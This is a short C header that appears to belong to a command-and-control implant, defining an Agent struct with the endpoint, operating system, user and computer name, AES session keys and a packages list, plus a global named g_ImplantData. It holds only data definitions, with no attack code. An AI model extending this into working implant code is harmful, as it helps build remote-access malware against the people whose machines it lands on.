#pragma once
#include "package.h"

#define AGENT_MAGIC_VALUE 0x0041153C //allsec in l33t speak.



typedef struct _Agent {
	UINT32 AgentID;
	char EndPoint[256];
	LPSTR OperatingSystem;
	LPSTR UserName;
	LPSTR ComputerName;
	unsigned char* AESKey;
	unsigned long AESKeySize;
	unsigned char* EncryptedAESKey;
	unsigned long EncryptedAESKeySize;

	pPackage packages;
}Agent, *pAgent;

extern Agent g_ImplantData;